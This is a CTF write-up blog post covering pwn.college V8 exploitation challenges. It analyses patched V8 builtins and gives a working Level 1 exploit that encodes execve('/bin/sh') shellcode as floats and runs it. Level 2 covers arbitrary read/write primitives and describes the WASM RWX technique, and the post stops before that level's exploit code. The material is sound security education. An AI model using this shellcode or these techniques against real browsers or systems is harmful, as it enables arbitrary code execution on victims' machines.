---
title: V8 PwnCollege Adventure
date: 2025-07-06 22:30:56 +/-0530
categories: [Chrome,CTFs]
tags: [v8,ctf,exploitation]     # TAG names should always be lowercase
description: My adventure through tackling V8 exploitation challenges and learning different techniques.
comments: false
future: true
---

## UNDER CONSTRUCTION
I'm still working on this post in my free time, you may still check out the parts I've completed. Thanks!


This is my journey through solving all [V8](https://v8.dev) exploitation challenges available in the [Quarterly Quiz](https://pwn.college/quarterly-quiz/v8-exploitation/) section of [PwnCollege](https://pwn.college/). I’ll be documenting all the **exploitation techniques** used in each challenge in detail, accompanied by **live debugging** and detailed **patch analysis** to break down how each component functions step by step. 

> I’ll be using the standard `/bin/sh` shellcode to demonstrate successful exploitation. To maintain the integrity of `PwnCollege`, I won’t reveal the flag or the exact flag-retrieval steps. That part of the challenge is intentionally left to the reader.
{: .prompt-info }

Since this will be a lengthy post, I’ve included an index below. Feel free to jump to any challenge that interests you or where you might be stuck. I’ve also assigned each challenge a descriptive name that reflects the underlying bug or exploitation technique used. With that, let’s begin the journey!

## Index
- [Context & Setup](http://127.0.0.1:4000/posts/V8-PwnCollege-Adventure/#context--setup)
- [Level 1 - Floating Shell](http://127.0.0.1:4000/posts/V8-PwnCollege-Adventure/#level-1---floating-shell)
- [Level 2 - JIT Spray](http://127.0.0.1:4000/posts/V8-PwnCollege-Adventure/#level-2---jit-spray)
- [Level 3 - Objects are Fake](http://127.0.0.1:4000/posts/V8-PwnCollege-Adventure/#level-3---objects-are-fake)
- [Level 4 - Controlled Length OOB](http://127.0.0.1:4000/posts/V8-PwnCollege-Adventure/#level-4---controlled-length-oob)
- [Level 5 - Off by One](http://127.0.0.1:4000/posts/V8-PwnCollege-Adventure/#level-5---off-by-one)
- [Level 6 - Array Function Map](http://127.0.0.1:4000/posts/V8-PwnCollege-Adventure/#level-6---array-function-map)
- [Level 7 - Turbo doesn't check Map](http://127.0.0.1:4000/posts/V8-PwnCollege-Adventure/#level-7---turbo-doesnt-check-map)
- [Level 8 - Min Max Dilemma](http://127.0.0.1:4000/posts/V8-PwnCollege-Adventure/#level-8---min-max-dilemma)
- [Level 9 - V8 SBX Escape](http://127.0.0.1:4000/posts/V8-PwnCollege-Adventure/#level-9---v8-sbx-escape)
- [Credits](http://127.0.0.1:4000/posts/V8-PwnCollege-Adventure/#credits)

## Context & Setup

After logging onto to pwncollege VM, you'll see there are some files provided in the `/challenge` folder.

![Desktop View](/assets/Browser/CTFs/V8_PwnCollege_Adventure/setup.png){: width="750" height="550" }

These files are essential for setting up the debugging environment for the challenge. The `REVISION` file specifies the `V8 git commit` that we need to check out. The `patch` file contains the modifications that introduce the specific bug in V8 we aim to exploit. The `args.gn` file defines the build configuration flags for V8. We’ll use the following commands to build V8 for the challenges. Keep in mind that these files will vary for each challenge, as they are tailored to the specific bug being explored.

```bash
git checkout <COMMIT> # Put the commit hash from the REVISION file here
git apply <PATCH_FILE> # Store contents of patch file and pass it here
gclient sync -D
gn args out/level-1 # Change Level number for each challenge, and enter the contents of args.gn in the VIM editor which gn opens
ninja -C out/level-1 d8 # Build d8
```

You may also build a `debug` version by setting `is_debug = true` in the `args.gn` file. I'll be using [pwndbg](https://github.com/pwndbg/pwndbg) for debugging, but you can work with just `gdb` as well. With that, let's begin our adventure.

## Level 1 - Floating Shell

### Patch Analysis

Let's analyze the `patch` file given in the `/challenge` directory and see what is it all about.

```diff
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index ea45a7ada6b..c840e568152 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -24,6 +24,8 @@
 #include "src/objects/prototype.h"
 #include "src/objects/smi.h"
 
+extern "C" void *mmap(void *, unsigned long, int, int, int, int);
+
 namespace v8 {
 namespace internal {
 
@@ -407,6 +409,47 @@ BUILTIN(ArrayPush) {
   return *isolate->factory()->NewNumberFromUint((new_length));
 }
 
+BUILTIN(ArrayRun) {
+  HandleScope scope(isolate);
+  Factory *factory = isolate->factory();
+  Handle<Object> receiver = args.receiver();
+
+  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast<JSArray>(*receiver))) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Nope")));
+  }
+
+  Handle<JSArray> array = Cast<JSArray>(receiver);
+  ElementsKind kind = array->GetElementsKind();
+
+  if (kind != PACKED_DOUBLE_ELEMENTS) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Need array of double numbers")));
+  }
+
+  uint32_t length = static_cast<uint32_t>(Object::NumberValue(array->length()));
+  if (sizeof(double) * (uint64_t)length > 4096) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("array too long")));
+  }
+
+  // mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  double *mem = (double *)mmap(NULL, 4096, 7, 0x22, -1, 0);
+  if (mem == (double *)-1) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("mmap failed")));
+  }
+
+  Handle<FixedDoubleArray> elements(Cast<FixedDoubleArray>(array->elements()), isolate);
+  FOR_WITH_HANDLE_SCOPE(isolate, uint32_t, i = 0, i, i < length, i++, {
+    double x = elements->get_scalar(i);
+    mem[i] = x;
+  });
+
+  ((void (*)())mem)();
+  return 0;
+}
+
 namespace {
 
 V8_WARN_UNUSED_RESULT Tagged<Object> GenericArrayPop(Isolate* isolate,
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 78cbf8874ed..4f3d885cca7 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -421,6 +421,7 @@ namespace internal {
   TFJ(ArrayPrototypePop, kDontAdaptArgumentsSentinel)                          \
   /* ES6 #sec-array.prototype.push */                                          \
   CPP(ArrayPush)                                                               \
+  CPP(ArrayRun)                                                                \
   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \
   /* ES6 #sec-array.prototype.shift */                                         \
   CPP(ArrayShift)                                                              \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 9a346d134b9..58fd42e59a4 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1937,6 +1937,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtin::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+	case Builtin::kArrayRun:
+	  return Type::Receiver();
 
     // ArrayBuffer functions.
     case Builtin::kArrayBufferIsView:
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..382c015bc48 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3364,7 +3364,7 @@ Local<FunctionTemplate> Shell::CreateNodeTemplates(
 
 Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3385,13 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3410,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
 
   return global_template;
 }
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 48249695b7b..40a762c24c8 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -2533,6 +2533,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
 
     SimpleInstallFunction(isolate_, proto, "at", Builtin::kArrayPrototypeAt, 1,
                           true);
+    SimpleInstallFunction(isolate_, proto, "run",
+                          Builtin::kArrayRun, 0, false);
     SimpleInstallFunction(isolate_, proto, "concat",
                           Builtin::kArrayPrototypeConcat, 1, false);
     SimpleInstallFunction(isolate_, proto, "copyWithin",
```

At a glance, the patch introduces a new built-in function named `ArrayRun`, which operates on arrays of double numbers. This is a custom addition to the V8 runtime, exposed to JavaScript as `[].run()`.  

```diff
+BUILTIN(ArrayRun) {
+  HandleScope scope(isolate);
+  Factory *factory = isolate->factory();
+  Handle<Object> receiver = args.receiver();
```

Internally, the function is defined using the `BUILTIN(ArrayRun)` macro, which registers it as a native C++ built-in. It begins with `HandleScope scope(isolate)`, which sets up a handle scope for memory management, ensuring proper lifetime handling of temporary V8 objects. Then, `Factory *factory = isolate->factory()` obtains a reference to the `factory` object, which is responsible for creating new V8 heap objects. Finally, `Handle<Object> receiver = args.receiver()` retrieves the receiver object—the one the `run()` method was invoked on—so the function can operate on it.

Moving on, 

```diff
+  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast<JSArray>(*receiver))) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Nope")));
+  }
```

The function then performs a couple of sanity checks. First, it verifies that the receiver is indeed a JavaScript array using `IsJSArray(*receiver)`. Next, it ensures that the array contains only **"simple"** elements—i.e., elements without holes, exotic behaviors, or accessors—via `HasOnlySimpleReceiverElements`. If either check fails, the function throws a `TypeError` with the message **"Nope"**. Further down,
```diff
+  Handle<JSArray> array = Cast<JSArray>(receiver);
+  ElementsKind kind = array->GetElementsKind();
+
+  if (kind != PACKED_DOUBLE_ELEMENTS) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Need array of double numbers")));
+  }
```
The function proceeds to `cast` the receiver into a `JSArray` handle using `Cast<JSArray>(receiver)`. It then inspects the array’s internal storage type via `array->GetElementsKind()`, which determines how the array elements are represented in memory. Specifically, it checks if the array uses `PACKED_DOUBLE_ELEMENTS`, meaning it contains tightly packed double-precision floating-point numbers without holes or undefined entries. If this condition isn't met, a `TypeError` is thrown with the message **"Need array of double numbers"**. 

```diff
+  uint32_t length = static_cast<uint32_t>(Object::NumberValue(array->length()));
+  if (sizeof(double) * (uint64_t)length > 4096) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("array too long")));
+  }
```

The next sanity check retrieves the length of the array using `array->length()` and checks whether the total memory footprint exceeds one memory page by evaluating `sizeof(double) * (uint64_t)length > 4096`. Since each double occupies `8 bytes`, this condition ensures that the total size of the array remains within `4096 bytes`—the size of a typical memory page. If the array exceeds this limit, a `TypeError` is thrown with the message **"array too long"**. 

We now know that `run()` expects a JS array of doubles under 4096 bytes. Let’s see what it actually does with that array.

### The Bug

```diff
+
+  // mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  double *mem = (double *)mmap(NULL, 4096, 7, 0x22, -1, 0);
+  if (mem == (double *)-1) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("mmap failed")));
+  }
+
+  Handle<FixedDoubleArray> elements(Cast<FixedDoubleArray>(array->elements()), isolate);
+  FOR_WITH_HANDLE_SCOPE(isolate, uint32_t, i = 0, i, i < length, i++, {
+    double x = elements->get_scalar(i);
+    mem[i] = x;
+  });
+
+  ((void (*)())mem)();
+  return 0;
+}
+
```

This is the most crucial part of the patch. The code uses `mmap(NULL, 4096, 7, 0x22, -1, 0)` to allocate a `4096-byte` memory region with `RWX` permissions. Here, `7` is the combination of `PROT_READ | PROT_WRITE | PROT_EXEC`, and `0x22` maps to `MAP_PRIVATE | MAP_ANONYMOUS`. 
 
This `RWX` memory allocation is a **major red flag** from a security perspective. RWX pages allow data to be both written to and executed, which is a classic recipe for arbitrary code execution.

Next, the array's internal backing store is retrieved as a `FixedDoubleArray`, which directly gives access to the underlying double values. The macro `FOR_WITH_HANDLE_SCOPE` is then used to iterate over the array. During each iteration, `elements->get_scalar(i)` fetches the `i-th` element, and it is written to the corresponding offset in the executable memory `(mem[i] = x)`. Essentially, this copies all the double values from the JavaScript array into the RWX memory region.

Finally, the line `((void (*)())mem)();` casts the beginning of the memory-mapped region to a function pointer and invokes it. This effectively jumps to the machine code that was just written into memory and executes it. 

The vulnerability here is crystal clear: An attacker can craft a `Float64Array` containing shellcode, pass it to `.run()`, and the shellcode will execute natively—leading to arbitrary code execution.

Just for completeness, the rest of the patch does the following operations -
```diff
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 78cbf8874ed..4f3d885cca7 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
+  CPP(ArrayRun)                                                                \

diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 9a346d134b9..58fd42e59a4 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
+	case Builtin::kArrayRun:
+	  return Type::Receiver();

diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 48249695b7b..40a762c24c8 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
+    SimpleInstallFunction(isolate_, proto, "run",
+                          Builtin::kArrayRun, 0, false);
```

The line `CPP(ArrayRun)` registers the `ArrayRun` function as a built-in in V8. The additions in `typer.cc` updates the type system to recognize `ArrayRun`. `SimpleInstallFunction` exposes the `ArrayRun` function to JavaScript as `Array.prototype.run`. 

### Exploitation

Okay, so now since we've understood the bug, let's try getting a shell form it. This challenge is very similar to the [Kit Engine](https://ir0nstone.gitbook.io/notes/binexp/browser-exploitation/picoctf-2021-kit-engine) challenge of [picoCTF](https://picoctf.org/) 2021.

Since the Array should be populated with double numbers, we need to inject shellcode by encoding it as floating-point numbers instead of using raw integers. We can write a function to do this -

```js
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
```
This function converts a `64-bit BigInt (val)` into a JavaScript Number that shares the same underlying bit representation. This is done by extracting the lower 32 bits using `val & 0xffffffffn` and the upper `32 bits` with `val >> 32n`. These two 32-bit chunks are then stored in a shared `ArrayBuffer` through the `Uint32Array view (u64_buf)`, with the lower bits placed at index `0` and the upper bits at index `1`. Finally, reading `f64_buf[0]`—the `Float64Array` view over the same buffer—returns a 64-bit float that has the exact same bitwise layout as the original integer. This allows us to reinterpret a 64-bit unsigned integer `(BigInt)` as a JavaScript `Number` (which uses a 64-bit IEEE-754 floating point format).

We now need to convert our raw shellcode into floating-point numbers. We can use [pwntools](https://github.com/Gallopsled/pwntools) and a simple python script to achieve this -

```python
from pwn import *

# set context
context.os = 'linux'
context.arch = 'amd64'

# Shellcode for execve("/bin/sh", NULL, NULL)
shellcode = asm(shellcraft.sh())
# NOP Padding
shellcode += b'\x90' * 4

# Shellcode Conversion
shellcode = [hex(c)[2:].rjust(2, '0') for c in shellcode]
eight_bytes = ['0x' + ''.join(shellcode[i:i+8][::-1]) for i in range(0, len(shellcode), 8)]

print(eight_bytes)
```

The script uses `asm(shellcraft.sh())` to generate standard shell-spawning shellcode (i.e., `execve("/bin/sh")`) and stores it in the variable `shellcode`. This is raw machine code in byte form. To ensure that the shellcode's length is a multiple of 8 bytes (for smoother conversion into 64-bit chunks), the script appends four `NOP (0x90)` instructions as padding.

Then, it converts each byte of the shellcode into a two-digit hexadecimal string and stores these in a list. Finally, it groups these hexadecimal byte strings into chunks of `8 bytes`, reverses each group to account for `little-endian` memory layout, and prefixes each with `0x` to create valid 64-bit hexadecimal values. These values form a list of 64-bit shellcode chunks, ready to be used as `BigInt` entries in JS exploit.

The output of the script will be as follows -

![Desktop View](/assets/Browser/CTFs/V8_PwnCollege_Adventure/output_1.png){: width="1000" height="1000" }

We can now use this `BigInt` array in our exploit, ensuring each element is suffixed with `n` to indicate it's a `BigInt` literal in JavaScript. Using the conversion function we created earlier, we'll populate a float array with the corresponding float representations of our shellcode and then invoke the `run()` function to trigger the exploit. The full exploit code is given below.

```js
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// Shellcode for execve("/bin/sh", NULL, NULL)
var payload = [
    0x6e69622fb848686an,
    0xe7894850732f2f2fn,
    0x2434810101697268n,
    0x6a56f63101010101n,
    0x894856e601485e08n,
    0x050f583b6ad231e6n
];

var payload_float = [];

for (let i = 0; i < payload.length; i++) {
    payload_float.push(itof(payload[i]));
}

// Trigger the exploit
payload_float.run();
```

After executing the above `exp.js` using `/challenge/run` provided in the VM, you should... get a shell!

![Desktop View](/assets/Browser/CTFs/V8_PwnCollege_Adventure/solution_1.png){: width="550" height="350" }

## Level 2 - JIT Spray

### Patch Analysis

Let’s analyze the `patch` file given in the `/challenge` directory and see where the bug is.

```diff
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..6b31fe2c371 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -1283,6 +1283,64 @@ struct ModuleResolutionData {
 
 }  // namespace
 
+void Shell::GetAddressOf(const v8::FunctionCallbackInfo<v8::Value>& info) {
+  v8::Isolate* isolate = info.GetIsolate();
+
+  if (info.Length() == 0) {
+    isolate->ThrowError("First argument must be provided");
+    return;
+  }
+
+  internal::Handle<internal::Object> arg = Utils::OpenHandle(*info[0]);
+  if (!IsHeapObject(*arg)) {
+    isolate->ThrowError("First argument must be a HeapObject");
+    return;
+  }
+  internal::Tagged<internal::HeapObject> obj = internal::Cast<internal::HeapObject>(*arg);
+
+  uint32_t address = static_cast<uint32_t>(obj->address());
+  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));
+}
+
+void Shell::ArbRead32(const v8::FunctionCallbackInfo<v8::Value>& info) {
+	Isolate *isolate = info.GetIsolate();
+	if (info.Length() != 1) {
+		isolate->ThrowError("Need exactly one argument");
+		return;
+	}
+	internal::Handle<internal::Object> arg = Utils::OpenHandle(*info[0]);
+	if (!IsNumber(*arg)) {
+		isolate->ThrowError("Argument should be a number");
+		return;
+	}
+	internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();
+	internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);
+	uint32_t addr = static_cast<uint32_t>(internal::Object::NumberValue(*arg));
+	uint64_t full_addr = base_addr + (uint64_t)addr;
+	uint32_t result = *(uint32_t *)full_addr;
+	info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, result));
+}
+
+void Shell::ArbWrite32(const v8::FunctionCallbackInfo<v8::Value>& info) {
+	Isolate *isolate = info.GetIsolate();
+	if (info.Length() != 2) {
+		isolate->ThrowError("Need exactly 2 arguments");
+		return;
+	}
+	internal::Handle<internal::Object> arg1 = Utils::OpenHandle(*info[0]);
+	internal::Handle<internal::Object> arg2 = Utils::OpenHandle(*info[1]);
+	if (!IsNumber(*arg1) || !IsNumber(*arg2)) {
+		isolate->ThrowError("Arguments should be numbers");
+		return;
+	}
+	internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();
+	internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);
+	uint32_t addr = static_cast<uint32_t>(internal::Object::NumberValue(*arg1));
+	uint32_t value = static_cast<uint32_t>(internal::Object::NumberValue(*arg2));
+	uint64_t full_addr = base_addr + (uint64_t)addr;
+	*(uint32_t *)full_addr = value;
+}
+
 void Shell::ModuleResolutionSuccessCallback(
     const FunctionCallbackInfo<Value>& info) {
   DCHECK(i::ValidateCallbackInfo(info));
@@ -3364,7 +3422,13 @@ Local<FunctionTemplate> Shell::CreateNodeTemplates(
 
 Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+  global_template->Set(isolate, "GetAddressOf",
+                       FunctionTemplate::New(isolate, GetAddressOf));
+  global_template->Set(isolate, "ArbRead32",
+                       FunctionTemplate::New(isolate, ArbRead32));
+  global_template->Set(isolate, "ArbWrite32",
+                       FunctionTemplate::New(isolate, ArbWrite32));
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3449,13 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3474,7 @@ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
 
   return global_template;
 }
diff --git a/src/d8/d8.h b/src/d8/d8.h
index a19d4a0eae4..476675a7150 100644
--- a/src/d8/d8.h
+++ b/src/d8/d8.h
@@ -507,6 +507,9 @@ class Shell : public i::AllStatic {
   };
   enum class CodeType { kFileName, kString, kFunction, kInvalid, kNone };
 
+  static void GetAddressOf(const v8::FunctionCallbackInfo<v8::Value>& args);
+  static void ArbRead32(const v8::FunctionCallbackInfo<v8::Value>& args);
+  static void ArbWrite32(const v8::FunctionCallbackInfo<v8::Value>& args);
   static bool ExecuteString(Isolate* isolate, Local<String> source,
                             Local<String> name,
                             ReportExceptions report_exceptions,
```

At the very bottom we see three new static methods are declared in the Shell class (as shown in d8.h). Each takes a `FunctionCallbackInfo` object, which provides access to arguments passed from JavaScript and a way to set the return value. 

```cpp
global_template->Set(isolate, "GetAddressOf", FunctionTemplate::New(isolate, GetAddressOf));
global_template->Set(isolate, "ArbRead32",    FunctionTemplate::New(isolate, ArbRead32));
global_template->Set(isolate, "ArbWrite32",   FunctionTemplate::New(isolate, ArbWrite32));
```

These lines add the new functions to the global JS environment in d8. After building, anyone using d8 can call these functions directly from JavaScript, allowing introspection and manipulation of internal memory, introducing powerful primitives as we'll see now. Let's discuss about the three functions that are added and what they do.

#### Address Of Primitive

```cpp
void Shell::GetAddressOf(const v8::FunctionCallbackInfo<v8::Value>& info) {
  // Gets the Isolate instance
  v8::Isolate* isolate = info.GetIsolate();

  // Checks if an argument was provided
  if (info.Length() == 0) {
    isolate->ThrowError("First argument must be provided");
    return;
  }

  // Gets the internal V8 handle for the JavaScript object
  internal::Handle<internal::Object> arg = Utils::OpenHandle(*info[0]);
  
  // Verifies it's a heap object (not a Smi/immediate value)
  if (!IsHeapObject(*arg)) {
    isolate->ThrowError("First argument must be a HeapObject");
    return;
  }
  
  // Casts to HeapObject and gets its address
  internal::Tagged<internal::HeapObject> obj = internal::Cast<internal::HeapObject>(*arg);
  uint32_t address = static_cast<uint32_t>(obj->address());
  
  // Returns the address as a JS number
  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));
}
```

The `GetAddressOf` function provides a low-level primitive for exposing the memory address of a `JavaScript Heap Object` within the V8 engine. It unwraps the first argument using `Utils::OpenHandle` and verifies whether it’s a V8-managed heap object via `IsHeapObject()`. If this check passes, it retrieves the object's internal pointer using the `address()` method, which returns its actual memory address (lower 4 byte offset of the address, due to [pointer compression](https://v8.dev/blog/pointer-compression)). Finally, the address is returned to the caller as a 32-bit unsigned integer using `Integer::NewFromUnsigned`.

The primary use-case of this function is to leak the memory address of JavaScript objects. Knowing the address of a heap object allows us to inspect object layouts in memory, determine the relative positioning of objects, and calculate offsets for arbitrary memory read/write operations. Indeed a useful primitive as we'll see later. Moving on...

#### Arbitrary Read Primitive

```cpp
void Shell::ArbRead32(const v8::FunctionCallbackInfo<v8::Value>& info) {
  // Basic argument validation
  if (info.Length() != 1) {
    isolate->ThrowError("Need exactly one argument");
    return;
  }
  
  // Gets the address argument
  internal::Handle<internal::Object> arg = Utils::OpenHandle(*info[0]);
  if (!IsNumber(*arg)) {
    isolate->ThrowError("Argument should be a number");
    return;
  }
  
  // Gets V8's heap compression base (important for pointer compression)
  internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();
  internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);
  
  // Calculates full address and performs read
  uint32_t addr = static_cast<uint32_t>(internal::Object::NumberValue(*arg));
  uint64_t full_addr = base_addr + (uint64_t)addr;
  uint32_t result = *(uint32_t *)full_addr;
  
  // Returns the read value
  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, result));
}
```

The `ArbRead32` function enables arbitrary 32-bit memory reads from the V8 engine's address space. It retrieves V8’s pointer compression **“cage base”** using `GetPtrComprCageBase()` and resolves the actual 64-bit base address through `V8HeapCompressionScheme::GetPtrComprCageBaseAddress()`. With this base address, it computes the absolute address to read from by adding the user-supplied numeric offset. This computed address `full_addr` is then interpreted as a pointer to a 32-bit unsigned integer, and the value at that address is dereferenced and returned to JavaScript.

The use-case for this function is to establish an arbitrary read primitive, which is critical in many exploit scenarios. It allows reading any 32-bit value from V8-managed memory (as long as the address can be derived from the compressed heap base). Let's also check out the `ArbWrite32` function.

#### Arbitrary Read Primitive

```cpp
void Shell::ArbWrite32(const v8::FunctionCallbackInfo<v8::Value>& info) {
  // Argument validation
  if (info.Length() != 2) {
    isolate->ThrowError("Need exactly 2 arguments");
    return;
  }
  
  // Gets address and value arguments
  internal::Handle<internal::Object> arg1 = Utils::OpenHandle(*info[0]);
  internal::Handle<internal::Object> arg2 = Utils::OpenHandle(*info[1]);
  if (!IsNumber(*arg1) || !IsNumber(*arg2)) {
    isolate->ThrowError("Arguments should be numbers");
    return;
  }
  
  // Gets heap base address
  internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();
  internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);
  
  // Calculates full address and performs write
  uint32_t addr = static_cast<uint32_t>(internal::Object::NumberValue(*arg1));
  uint32_t value = static_cast<uint32_t>(internal::Object::NumberValue(*arg2));
  uint64_t full_addr = base_addr + (uint64_t)addr;
  *(uint32_t *)full_addr = value;
}
```

The `ArbWrite32` function introduces an arbitrary 32-bit write primitive into the V8 runtime. The first argument represents the `address offset` (relative to V8’s compressed heap base), and the second is the 32-bit value to write. Similar to `ArbRead32`, it computes the full memory address by obtaining the pointer compression **"cage base"** via `GetPtrComprCageBase()` and resolving the actual address with `V8HeapCompressionScheme::GetPtrComprCageBaseAddress()`. The address offset is added to this base, forming a full 64-bit pointer. Finally, the 32-bit value is written directly into memory at the computed location.

### Exploitation

Now that we’ve examined the entire patch, you might be wondering—where’s the bug? In fact, there isn’t one in the traditional sense. Instead, this patch deliberately introduces powerful memory primitives. 

As the natural complement to `ArbRead32`, the `ArbWrite32` function when combined with `GetAddressOf`, all together, provide the full read/write primitives necessary to achieve arbitrary code execution within the Renderer process. How exactly do we achieve this? Let's find out.

Before modern security mitigations, `WebAssembly (WASM)` in JavaScript offered a highly effective vector for code execution when paired with arbitrary read/write primitives. A typical WASM setup includes a module `instance` that holds both the compiled code and its linear memory. Crucially, the compiled WASM code was stored in memory marked as `Read-Write-Execute (RWX)`, and included a function table for indirect calls.

Using ARW capabilities, attackers could exploit this setup in several steps. First, they would scan memory to locate the WASM instance and extract a reference to the code object. From there, they could identify the pointer to the RWX region where the compiled WASM code resided. With this pointer leaked, attackers would then overwrite the RWX memory with native shellcode. Finally, by invoking the corresponding WASM function, they could execute their payload—achieving code execution within the JavaScript engine. You may refer this [Writeup](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) for more info.

